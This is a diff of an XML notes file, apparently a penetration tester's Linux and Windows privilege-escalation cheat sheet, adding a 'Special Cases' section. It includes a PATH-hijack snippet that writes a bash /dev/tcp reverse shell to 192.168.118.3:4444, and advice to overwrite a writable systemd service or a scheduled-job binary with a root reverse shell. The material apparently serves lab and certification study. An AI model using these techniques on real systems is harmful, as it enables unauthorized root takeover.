@@ -444,7 +444,7 @@ Also check this out: </rich_text>
       <rich_text>We have to pay attention to </rich_text>
       <rich_text weight="heavy">files on the machine</rich_text>
       <rich_text>, most of the time, this is how privilege escalation is done.</rich_text>
-      <node name="Linux" unique_id="109" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="5" is_bold="0" foreground="" ts_creation="1688924277" ts_lastsave="1689886544">
+      <node name="Linux" unique_id="109" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="5" is_bold="0" foreground="" ts_creation="1688924277" ts_lastsave="1690221707">
         <rich_text>!Check if we are in a container:
 </rich_text>
         <rich_text justification="left"></rich_text>
@@ -485,11 +485,6 @@ Check files manually:
 
 Manually check:
 - SUID
-If a strange binary is found as SUID, check it's system calls:
-</rich_text>
-        <rich_text justification="left"></rich_text>
-        <rich_text>
-
 - SGID
 - Cronjobs (</rich_text>
         <rich_text style="italic">crontab -l</rich_text>
@@ -514,15 +509,42 @@ Check capabilities:
 # of them from outside)</codebox>
         <codebox char_offset="102" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">uname -a</codebox>
         <codebox char_offset="357" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">find / -perm -04000 2&gt;/dev/null</codebox>
-        <codebox char_offset="662" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ltrace {binary} # This will load the executable and print every system call
+        <codebox char_offset="656" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">grep "CRON" /var/log/syslog</codebox>
+        <codebox char_offset="756" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">getcap -r / 2&gt;/dev/null
+# And search for everyone</codebox>
+        <node name="Special Cases" unique_id="117" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1690221496" ts_lastsave="1690221818">
+          <rich_text>---------------------- Services and Reboot Privs ----------------------
+If we have these SUDO capabilities (sudo -l):
+
+We may find writable services inside etc:
+
+
+Then we may overwrite this service with one that executes a reverse shell from root, then </rich_text>
+          <rich_text weight="heavy">sudo reboot</rich_text>
+          <rich_text>.
+More on it here: </rich_text>
+          <rich_text link="webs https://security.stackexchange.com/a/264911">https://security.stackexchange.com/a/264911</rich_text>
+          <rich_text>
+
+---------------------- Custom SUIDs ----------------------
+If a strange binary is found as SUID, check it's system calls:
+</rich_text>
+          <rich_text justification="left"></rich_text>
+          <rich_text>
+This may be vulnerable to path injection.
+More on that here: </rich_text>
+          <rich_text link="webs https://systemweakness.com/linux-privilege-escalation-using-path-variable-manipulation-64325ab05469">https://systemweakness.com/linux-privilege-escalation-using-path-variable-manipulation-64325ab05469</rich_text>
+          <codebox char_offset="118" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">User lowpriv may run the following commands on hetemit:
+    (root) NOPASSWD: /sbin/halt, /sbin/reboot, /sbin/poweroff</codebox>
+          <codebox char_offset="162" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">find /etc -writable 2&gt;/dev/null
+./systemd/system/normal.service</codebox>
+          <codebox char_offset="452" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ltrace {binary} # This will load the executable and print every system call
 # If any systemcall is not with absolute path, we can inject into path:
 export PATH=/tmp:$PATH
 # and add to that path a reverse shell with the name of that binary system call (called without absolute path)
 echo 'bash -c "bash -i &gt;&amp; /dev/tcp/192.168.118.3/4444 0&gt;&amp;1"' &gt; /tmp/{binary}
 chmod +x /tmp/{binary}</codebox>
-        <codebox char_offset="722" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">grep "CRON" /var/log/syslog</codebox>
-        <codebox char_offset="822" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">getcap -r / 2&gt;/dev/null
-# And search for everyone</codebox>
+        </node>
       </node>
       <node name="Windows" unique_id="110" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="5" is_bold="0" foreground="" ts_creation="1688924320" ts_lastsave="1689504810">
         <rich_text>Use (and read CAREFULLY the output):
@@ -589,10 +611,11 @@ Get-ChildItem -Recurse | Where {$_.Name -match 'Interesting-Name'} | Select Full
         <codebox char_offset="672" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Get-NetLoggedon</codebox>
         <codebox char_offset="691" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Get-NetSession</codebox>
       </node>
-      <node name="STUCK?" unique_id="111" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="19" is_bold="0" foreground="" ts_creation="1689415044" ts_lastsave="1689708492">
+      <node name="STUCK?" unique_id="111" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="19" is_bold="0" foreground="" ts_creation="1689415044" ts_lastsave="1690138049">
         <rich_text>- Recheck every line of output from Winpeas/Linpeas
 - Recheck files
 - Rerun Winpeas/Linpeas
+
 - If in AD, try SharpHound and analyze object ACL - </rich_text>
         <rich_text weight="heavy">Only Windows</rich_text>
         <rich_text>
@@ -609,6 +632,14 @@ Get-ChildItem -Recurse | Where {$_.Name -match 'Interesting-Name'} | Select Full
         <rich_text>, maybe it is a public exploit - </rich_text>
         <rich_text weight="heavy">Only Windows</rich_text>
         <rich_text>
+- Check if there is a binary that </rich_text>
+        <rich_text weight="heavy">backups</rich_text>
+        <rich_text> or does a </rich_text>
+        <rich_text weight="heavy">job that may be a service or a scheduled job </rich_text>
+        <rich_text>and replace with a reverse shell - </rich_text>
+        <rich_text weight="heavy">Only Windows</rich_text>
+        <rich_text>
+
 - Always check </rich_text>
         <rich_text weight="heavy">GTFOBins</rich_text>
         <rich_text> for SUIDs and SUDO capabilities (No matter if it look not probable) - </rich_text>
